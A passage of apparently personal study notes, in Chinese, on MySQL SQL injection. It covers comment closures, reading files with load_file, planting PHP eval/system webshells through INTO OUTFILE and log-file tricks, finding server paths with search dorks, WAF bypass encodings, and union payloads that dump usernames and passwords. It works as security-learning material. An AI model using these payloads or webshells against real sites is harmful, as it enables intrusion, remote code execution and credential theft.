+<h3 id="3、关于Mysql注释"><a href="#3、关于Mysql注释" class="headerlink" title="3、关于Mysql注释"></a>3、关于Mysql注释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#单行注释</span><br><span class="line">-- 单行注释</span><br></pre></td></tr></table></figure>
+
+<p>在 Sql 注入中，需要使用 Mysql 的注释符号，需要去注释注入语句后面的语句不被执行，Mysql中单行注释有两种方式，分别是<code>#</code>和<code>-- </code>(–后面有空格)</p>
+<p>但是，需要注意的是，在url中，如果是get请求，解释执行的时候，url中<code>#</code>号是用来指导浏览器动作的，对服务器端无用。所以，HTTP请求中使用 get 传参时不包括#，因为使用 # 闭合无法注释，会报错；<strong>而使用– （有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用 <code>--+</code> 的方式来闭合，因为+会被解释成空格。</strong></p>
+<blockquote>
+<ul>
+<li>也可以使用<code>--%20</code>，把空格转换为<code>url encode</code>编码格式，也不会报错。同理把 <code>#</code> 变成 <code>%23</code> ,也不报错。</li>
+<li>如果是<code>post</code>请求，则可以直接使用<code>#</code>来进行闭合。常见的就是表单注入，如我们在后台登录框中进行注入。</li>
+</ul>
+</blockquote>
+<p>在进行请求时可以使用下列方法进行注释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 -- -</span><br><span class="line">?id=1&#x27; and 1=1 --+-</span><br><span class="line">?id=1&#x27; and 1=1 --%20-</span><br><span class="line">?id=1&#x27; and 1=1 --/**/-    # 这在sql中会强制占位变成空格</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4、Mysql跨库注入"><a href="#4、Mysql跨库注入" class="headerlink" title="4、Mysql跨库注入"></a>4、Mysql跨库注入</h3><p>跨库注入是指攻击者可以通过注入攻击代码来执行对其他数据库的操作。攻击者可以使用这种技术来获取或修改其他数据库的数据，包括敏感信息的泄露、恶意代码的执行、修改或删除数据等。跨库注入首先需要明确注入点的权限，若不是root权限或者管理员权限，那么无法执行跨库注入，只有高权限才能执行跨库注入。</p>
+<p>简单来说，跨库注入就是在同一个数据库管理系统中，在某一个点存在SQL注入，而通过这点查询到，该权限为 root 权限，那么就可以使用这种方式去操作同数据库下的其它网站数据库，这样就实现的跨库注入。</p>
+<h3 id="5、Mysql文件读写⭐"><a href="#5、Mysql文件读写⭐" class="headerlink" title="5、Mysql文件读写⭐"></a>5、Mysql文件读写⭐</h3><p>MySQL读写文件方法大致有这几个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_file()、load data infile()、into outfile、into dumpfile</span><br></pre></td></tr></table></figure>
+
+<p>进行文件读写需要满足的条件：</p>
+<p>1、<code>secure_file_priv</code> 值允许对该路径下的文件进行操作。（查看方法：<code>show variables like &#39;secure_file_priv&#39;;</code>）</p>
+<p>2、<code>secure_file_priv</code> 的值说明：</p>
+<ul>
+<li>值为 <strong>NULL</strong>，表示禁止文件的导入与导出</li>
+<li>值为 <strong>某一目录</strong>，表示只能对该目录下的文件导入与导出</li>
+<li>值为 <strong>空</strong> ，表示不对文件的读写进行限制</li>
+</ul>
+<blockquote>
+<p>在mysql 5.6.34版本以后 <code>secure_file_priv</code> 的值默认为NULL。可以通过以下方式修改：</p>
+<ul>
+<li>在windows中，修改 <code>mysql.ini</code> 文件，在 <code>[mysqld]</code> 下添加条目：<code>secure_file_priv =</code></li>
+<li>在Linux中在 <code>/etc/my.cnf</code> 的 <code>[mysqld]</code> 下面添加 <code>secure_file_priv = &#39;&#39;</code> 选项</li>
+</ul>
+</blockquote>
+<p>3、数据库用户对文件有读权限</p>
+<p>4、知道文件的完整路径</p>
+<p>5、文件大小小于 <code>max_allowed_packet</code>（ <code>load_file()</code> 函数受到这个值的限制）（查看方法：<code>show global variables like &#39;max_allowed%&#39;;</code> ，查看结果是以字节（bytes）为单位显示。）</p>
+<h4 id="1）文件读取函数"><a href="#1）文件读取函数" class="headerlink" title="1）文件读取函数"></a>1）文件读取函数</h4><h5 id="文件读取函数：load-file"><a href="#文件读取函数：load-file" class="headerlink" title="文件读取函数：load_file()"></a>文件读取函数：<code>load_file()</code></h5><p><code>load_file()</code> 除了读取本地文件，同样也支持网络路径。</p>
+<p><img src="/2023/12/18/SQL%E6%B3%A8%E5%85%A5/oCam_2023_12_11_16_24_57_782.png"></p>
+<blockquote>
+<p>如果时字母的话，好像会直接读出来；但是如果包括其它字符，比如中文的话，就会读出UTF-8编码来。</p>
+</blockquote>
+<h5 id="文件读取函数：load-data-infile"><a href="#文件读取函数：load-data-infile" class="headerlink" title="文件读取函数：load data infile"></a>文件读取函数：<code>load data infile</code></h5><p>使用local需要设置 <code>local_infile</code> 开启，该变量默认为ON，可以使用以下命令查看： <code>SHOW GLOBAL VARIABLES LIKE &#39;local_infile&#39;</code> 。</p>
+<p>如果指定 <code>local</code> 关键词 <code>load data local infile &lt;文件路径&gt; into TABLE &lt;表名&gt;</code> ，则表明从客户主机读文件：</p>
+<blockquote>
+<ul>
+<li>如果指定的文件路径为绝对路径，则客户机从根目录开始查找该文件。</li>
+<li>如果指定的文件路径为相对路径，则客户机从当前目录开始查找该文件。</li>
+</ul>
+</blockquote>
+<p>如果没指定 <code>local</code> 关键词 <code>load data infile &lt;文件路径&gt; into TABLE &lt;表名&gt;</code> ，则文件必须位于服务器上：</p>
+<blockquote>
+<ul>
+<li>如果指定的文件路径为绝对路径，则服务器从根目录开始查找该文件。</li>
+<li>如果指定的文件路径为相对路径，则服务器从数据库的数据目录中开始查找该文件。</li>
+</ul>
+</blockquote>
+<p><img src="/2023/12/18/SQL%E6%B3%A8%E5%85%A5/oCam_2023_12_11_16_28_53_124.png"></p>
+<blockquote>
+<p><code>load_file()</code>和<code>load data infile</code>读取文件可以直接读取，也可以新建一个表，读取文件为字符串形式插入表中，然后读出表中数据。</p>
+</blockquote>
+<h4 id="2）文件写入函数"><a href="#2）文件写入函数" class="headerlink" title="2）文件写入函数"></a>2）文件写入函数</h4><h5 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a><code>into outfile</code></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 语法格式：</span><br><span class="line"><span class="keyword">SELECT</span> column1,column2,...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>        </span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;file_path&#x27;</span>         # 指定文件所在的路径</span><br><span class="line">FIELDS TERMINATED <span class="keyword">by</span> <span class="string">&#x27;char&#x27;</span>;     # 每一条记录的数据之间默认以 Tab 分隔，也可使用 fields terminated 参数指定分隔符，例如&quot;\t&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>除了 <code>into outfile &#39;file_path&#39;</code> ，其余的 <code>from</code> 、 <code>where</code> 、 <code>fields</code> 都不是必需的</p>
+</blockquote>
+<h5 id="into-dumpfile"><a href="#into-dumpfile" class="headerlink" title="into dumpfile"></a><code>into dumpfile</code></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 语法格式</span><br><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;file_path&#x27;</span></span><br><span class="line">[options]</span><br></pre></td></tr></table></figure>
+
+<p><code>into outfile</code> 和 <code>into dumpfile</code> 的区别</p>
+<ul>
+<li><p>导出的行数不一样。<code>outfile</code> 函数可以导出（导出数据库数据，写入文件）多行数据；而 <code>dumpfile</code> 只能导出一行数据</p>
+</li>
+<li><p>是否转义输出。<code>outfile</code> 对导出内容中的\n等特殊字符进行了转义，并且在文件内容的末尾增加了一个新行；而 <code>dumpfile</code> 对文件内容是原意写入，未做任何转移和增加。所以基于此在UDF提权中一般使用 <code>dumpfile</code> 进行dll文件写入</p>
+</li>
+<li><p>是否允许二进制文件。 <code>outfile</code> 后面不能接 <code>0x</code> 开头或者 <code>char</code> 转换以后的路径，只能是单引号路径。这个问题在php注入中很棘手，因为会自动将单引号转义成 <code>\&#39;</code> ，请千万注意；但 <code>dumpfile</code> ，后面的路径可以是单引号、<code>0x</code>、<code>char</code>转换的字符，但是路径中的斜杠是 <code>/</code> 而不是 <code>\</code> 。因为 <code>dumpfile</code> 允许写二进制文件。</p>
+</li>
+</ul>
+<h4 id="3）基于Mysql写入shell的方式"><a href="#3）基于Mysql写入shell的方式" class="headerlink" title="3）基于Mysql写入shell的方式"></a>3）基于Mysql写入shell的方式</h4><h5 id="基于文件写入函数⭐"><a href="#基于文件写入函数⭐" class="headerlink" title="基于文件写入函数⭐"></a>基于文件写入函数⭐</h5><p>基于文件写入函数 <code>into outfile</code> 和 <code>into dumpfile</code> 写入shell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 将一句话木马&quot;&lt;?php eval($_REQUEST[1]);?&gt;&quot;通过十六进制编码写入网站根目录</span><br><span class="line"># &quot;&lt;?php eval($_POST[&#x27;shell&#x27;]);?&gt;&quot;</span><br><span class="line"># &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line"># &quot;&lt;?php @system($_GET[&#x27;aaa&#x27;]);  ?&gt;&quot;    # 这个会报毒，然后删掉</span><br><span class="line"># &quot;&lt;?php @system($_GET[abc]);  ?&gt;&quot;      # ?abc<span class="operator">=</span>dir</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-3</span><span class="string">&#x27;)) union select 1,0x3c3f706870206576616c28245f524551554553545b315d293b3f3e,3 into outfile &#x27;</span>C:\\Users\\Administrator.WIN2012\\Desktop\\phpStudy\\WWW\\outfile.php<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dir    // 是一个用于列出目录中文件和子目录的命令</span><br><span class="line">dir /s /b &quot;C:/z2/phpstudy_pro/WWW/sqli&quot;</span><br><span class="line">    - /s    参数表示搜索指定目录及其子目录中的文件。</span><br><span class="line">    - /b    参数表示以简洁的方式列出文件和子目录的名称，不显示其他信息。</span><br><span class="line">    - C:\path\to\folder    是你想要列出文件和子目录的目标文件夹的路径。</span><br><span class="line">type file1.txt &gt;&gt; file2.txt</span><br><span class="line">    - type         是用于显示文件内容的命令。</span><br><span class="line">    - file1.txt    是源文件的名称。</span><br><span class="line">    - &gt;&gt;           表示将输出附加到指定的文件，如果文件不存在则创建文件。</span><br><span class="line">    - file2.txt    是目标文件的名称，文件内容将被追加到这个文件中。</span><br><span class="line">type &quot;C:\z2\phpstudy_pro\WWW\sqli\Less-7\index.php&quot; &gt;&gt; &quot;C:\z2\phpstudy_pro\WWW\sqli\Less-7\1.text&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="基于全局日志的写入⭐"><a href="#基于全局日志的写入⭐" class="headerlink" title="基于全局日志的写入⭐"></a>基于全局日志的写入⭐</h5><p>基于全局日志的写入方式，适用于 <code>secure_file_priv</code> 这个配置参数限制了文件写入函数 <code>into outfile</code> 或 <code>into dumpfile</code> 函数的使用，没有写权限。有root权限，能够执行sql语句，并且网站的绝对路径且具有写入权限。查看日志配置，关注日志监测是否开启，然后修改日志路径，来写入shell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 查看全局日志配置，包括log日志的开启状态和日志文件存储位置</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;%general%&quot;;</span><br><span class="line"></span><br><span class="line"># 开启日志监测</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;</span><br><span class="line"></span><br><span class="line"># 设置需要写入的路径</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;file path&#x27;</span>;    # 例如：C:<span class="operator">/</span>z2<span class="operator">/</span>phpstudy_pro<span class="operator">/</span>WWW<span class="operator">/</span><span class="number">1.</span>php</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// C:\z2\phpstudy_pro\Extensions\MySQL5.7.26\data\DES...</span></span><br><span class="line"><span class="comment">// /var/lib/mysql/180c628a3480.log</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"># 然后执行<span class="keyword">sql</span>语句，mysql会将我们执行的语句记录到日志文件(上一步修改后的文件)中</span><br><span class="line"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;shell&#x27;]);?&gt;&quot;;</span><br><span class="line"><span class="keyword">select</span> &quot;&lt;?php phpinfo(); ?&gt;&quot;;</span><br><span class="line"></span><br><span class="line"># 结束后，再修改为原来的路径</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;原来的路径&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 关闭日志记录</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> off;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="基于慢查询日志的写入"><a href="#基于慢查询日志的写入" class="headerlink" title="基于慢查询日志的写入"></a>基于慢查询日志的写入</h5><p>慢日志记录的是执行时间超过一定时间的语句，默认的执行时间为10秒，通常情况下执行sql语句时的执行时间一般不会超过10s，所以说慢日志文件应该是比较小的，而全局日志记录文件会记录大量数据，可能会影响我们写入的内容。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 查询慢日志功能开启状态以及慢日志目录 </span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow_query_log%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 查看服务器默认时间值方式</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%long_query_time%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 开启慢日志功能</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log <span class="operator">=</span> <span class="string">&#x27;ON&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 设置慢日志路径</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_file <span class="operator">=</span> <span class="string">&#x27;file path&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 写入shell</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_REQUEST[&quot;a&quot;]);?&gt;&#x27;</span> <span class="keyword">or</span> sleep(<span class="number">11</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4）路径获取常见方法"><a href="#4）路径获取常见方法" class="headerlink" title="4）路径获取常见方法"></a>4）路径获取常见方法</h4><p>文件读写的前提是获取到目标网站的相关文件路径，常见的获取文件路径的方法：</p>
+<p>1、报错显示</p>
+<blockquote>
+<p>网站报错时，会显示一些路径信息，可以使用谷歌语法搜素，结合关键字搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.edu.tw &quot;warning&quot;</span><br><span class="line">site:xxx.com.tw &quot;fatal error&quot;</span><br></pre></td></tr></table></figure>
+
+<p>2、遗留文件</p>
+<blockquote>
+<p>很多网站的根目录下都存在测试文件，可以利用这些测试文件获取绝对路径，例如类似 <code>phpinfo()</code>。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/test.php</span><br><span class="line">www.xxx.com/ceshi.php</span><br><span class="line">www.xxx.com/info.php</span><br><span class="line">www.xxx.com/phpinfo.php</span><br><span class="line">www.xxx.com/php_info.php</span><br><span class="line">www.xxx.com/1.php</span><br></pre></td></tr></table></figure>
+
+<p>3、漏洞报错</p>
+<p>包括单引号爆路径和错误参数值爆路径。</p>
+<p>对于单引号爆路径，直接在URL后面加单引号（例如：<code>www.xxx.com/news.php?id=149&#39;</code>），要求单引号没有被过滤服务器默认返回错误信息；</p>
+<p>对于错误参数值爆路径，将要提交的参数值改成错误值（例如：<code>www.xxx.com/researcharchive.php?id=-1</code>），比如-1、-99999、…等，单引号被过滤时不妨试试。</p>
+<p>4、平台配置文件</p>
+<p>如果存在Sql注入点有文件读取权限，就可以手工 <code>load_file</code> 或工具读取配置文件，再从中寻找路径信息。各平台下Web服务器和PHP的配置文件默认路径可以上网查。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">c:\windows\php.ini                                  // php配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml            // IIS虚拟主机配置文件</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">/etc/php.ini                                        // php配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf                          // Apache配置文件</span><br><span class="line">/usr/local/apache/conf/extra/httpd-vhosts.conf      // 虚拟目录配置文件</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="SQL注入⭐"><a href="#SQL注入⭐" class="headerlink" title="SQL注入⭐"></a>SQL注入⭐</h2><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><p>sql注入流程：寻找注入点 -》判断闭合方式 -》验证 -》判断列数及回显位 -》取数据</p>
+<p>寻找注入点：一般来讲，在网站中，注入点都存在于可以与数据库交互的地方，如搜索框，登录输入框、更新、查询、删除等。那么我们找到了可能存在注入点的地方，就需要进行测试，这里采用手工测试的方式，帮助各位靓仔们更好的理解。</p>
+<p>万能密码：<code>&#39;or 1＝1</code> 其原理是使用单引号对前面的语句进行闭合，这样后面的语句就会被当作正常的sql语句解析，而or为或运算符，即使前面的字符不为真，语句也可以正常执行</p>
+<p>union联合查询注入过程：判断注入点 -》 判断列数 -》 判断显错点 -》 获取数据库名 -》 获取表名 -》 获取列名 -》 获取数据</p>
+<h3 id="后台防止sql注入方法及解决方法⭐"><a href="#后台防止sql注入方法及解决方法⭐" class="headerlink" title="后台防止sql注入方法及解决方法⭐"></a>后台防止sql注入方法及解决方法⭐</h3><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1849607">https://cloud.tencent.com/developer/article/1849607</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">方式一：utf-8，转义</span><br><span class="line"></span><br><span class="line">    - 有utf-8在，没法用宽字节注入，除非后台sql用的是gbk，才有可能</span><br><span class="line">    - 因为转义的话，有可能会出现--被转移掉，但是#不会被转义掉，所以可以把那些字符都试一下</span><br><span class="line">    - 后台是gbk的话，可以尝试用一下二次注入，例如：更新密码</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">方式二：#、--、or、and、&#x27;、&quot;、空格、/**/、换行、union、select 绕过</span><br><span class="line"></span><br><span class="line">    - 1=1              =&gt; 1 、 ture=true 、 true 、 -1 in -1 、 1 like 1 、 mod(6,5) in (1)</span><br><span class="line">    - #、--            =&gt; 的话就只能使sql语句前后闭合，不能把后面注释掉</span><br><span class="line">    - or、and          =&gt; oorr、anandd、||、&amp;&amp;</span><br><span class="line">    - union、select    =&gt; 可以用注释岔开 uni/**/on、s/**/ele/**/ct，使用大小写分开seLECt、UNion</span><br><span class="line">    - &#x27;、&quot;             =&gt; 使用十六进制(引号不用): &quot;users&quot; === 0x7573657273</span><br><span class="line">    - 空格space(0x20)    =&gt; /*注释*/</span><br><span class="line">                        =&gt; Tab(0x09)</span><br><span class="line">                        =&gt; VT垂直制表(0x0B)</span><br><span class="line">                        =&gt; Linux换行LF(0x0A)</span><br><span class="line">                        =&gt; Window换行LF回车CR(0x0A0x0D)</span><br><span class="line">                        =&gt; 用 () 来逃逸绕过，把用到空格的注入语句变成用不到空格的注入语句，比如报错注入函数、盲注函数</span><br><span class="line">                        =&gt; /*! xxx */;</span><br><span class="line">                            =&gt; SELECT * FROM users WHERE id=&#x27;0&#x27; union/*/!*!**/</span><br><span class="line">                            =&gt; select 1,2,database/*///-*/()</span><br><span class="line">                            =&gt; SELECT * FROM table_name /*! USE INDEX (index_name) */;</span><br><span class="line">                            =&gt; SELECT * FROM table_name /*! IGNORE INDEX (index_name) */;</span><br><span class="line">SELECT * FROM users WHERE id=&#x27;0&#x27; union/*/!*!**/select 1,2,database/*///-*/()</span><br><span class="line">SELECT * FROM users WHERE id=&#x27;0&#x27; union/*/!*!**/select 1,2,database/*!20553()*/</span><br><span class="line"></span><br><span class="line">    - 使用浮点数: 8 union === 8E0union</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注释符号<code>/*!20553()*/</code>实际上是用来绕过一些SQL注入防护机制的。在MySQL中，<code>/*! ... */</code>是一种特殊的注释语法，其中20553是一个伪装成MySQL版本号的数字。这个数字的作用是欺骗一些安全机制，使得恶意的UNION查询可以成功执行。</p>
+<p>这种注释语法可以让我们在不修改实际查询语句的情况下，控制MySQL的执行方式，从而达到优化查询性能的目的。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">方式三：cookie设置Base64编码</span><br><span class="line"></span><br><span class="line">    - 比较麻烦，毕竟你不知道它后台用的是什么解密类型</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">方式四：保存请求头、cookie的数据</span><br><span class="line"></span><br><span class="line">    - 可以一试，不过感觉比较少会把这个保存到数据库里</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">方式五：不让后台数据库的报错显示到前端来</span><br><span class="line"></span><br><span class="line">    - 没有报错的话，看看数据有没有显示到前端来，或者使用盲注</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">方式六：&#x27;&#x27; &quot;&quot; () (()) (&#x27;&#x27;) ((&#x27;&#x27;)) (&quot;&quot;) ((&quot;&quot;)) 特殊闭合</span><br><span class="line"></span><br><span class="line">    - 比较简单，尝试多次即可</span><br></pre></td></tr></table></figure>
+
+<p>在PHP中，使用 <code>mysqli_real_escape_string()</code> 函数对SQL语句的参数进行转义，会转义掉单引号、双引号、反斜杠和NUL（ASCII 0）字符、#字符，不会转义掉其他特殊字符。</p>
+<p>在Java中，使用 <code>PreparedStatement</code> 对象对SQL语句的参数进行转义，会自动转义掉特殊字符，包括单引号、双引号、反斜杠、#字符等。</p>
+<p>在Python中，使用参数化查询<code>（Prepared Statement）</code>可以对SQL语句的参数进行转义，会自动转义掉特殊字符，包括单引号、双引号、反斜杠、#字符等。</p>
+<h3 id="常用⭐"><a href="#常用⭐" class="headerlink" title="常用⭐"></a>常用⭐</h3><p>常用MySQL语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 192.168.2.77 -P 3306 -u root -p rooot    # 远程登录</span><br><span class="line">show databases;    # 查询所有数据库</span><br><span class="line">use security;      # 使用 security 数据库</span><br><span class="line">show tables;       # 查询当前数据库的所有表</span><br><span class="line">select * from users;    # 查询当前数据库的users表的所有数据</span><br></pre></td></tr></table></figure>
+
+<p>如何判断有多少占位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,3,4,5,6,7,8,9;    # 不断递减。查询出当前使用的SQL语句所输出的字段数</span><br><span class="line">?id=0&#x27; order by 2;                        # order by后的数字不断递增。查询出当前使用的SQL语句所在表的的字段数</span><br></pre></td></tr></table></figure>
+
+<p>联合查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,3-- -               # 使用联合查询union时，必须使前面的占位数量与后面的占位数量相同</span><br><span class="line">?id=0&#x27; union select 1,database(),3-- -      # 可以把会显示前端的占位换成别的，比如各种函数，如：database()</span><br><span class="line">?id=0&#x27; union select 1,database(),user()-- -</span><br><span class="line">?id=0&#x27; union select 1,database(),(group_concat(id,&#x27; &#x27;,username,&#x27; &#x27;,password)) from security.users-- -</span><br></pre></td></tr></table></figure>
+
+<p>常用注入语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库版本、当前数据库名、查看当前数据库用户、查看系统用户名、查看数据库路径、查看操作系统</span><br><span class="line">?id=0&#x27; union select 1,2,version(),database(),user(),system_user(),@@datadir,@@version_compile_os limit 0,1</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0&#x27; union select 1,2,3,group_concat(schema_name) from information_schema.schemata limit 0,1</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0&#x27; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">?id=0&#x27; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">?id=0&#x27; union select 1,2,3,group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users limit 0,1</span><br></pre></td></tr></table></figure>
+
+<h3 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h3><p>sql注入可以分为以下类型（都以PHP作为案例）</p>
+<h4 id="1、联合查询"><a href="#1、联合查询" class="headerlink" title="1、联合查询"></a>1、联合查询</h4><p><strong>数字型</strong></p>
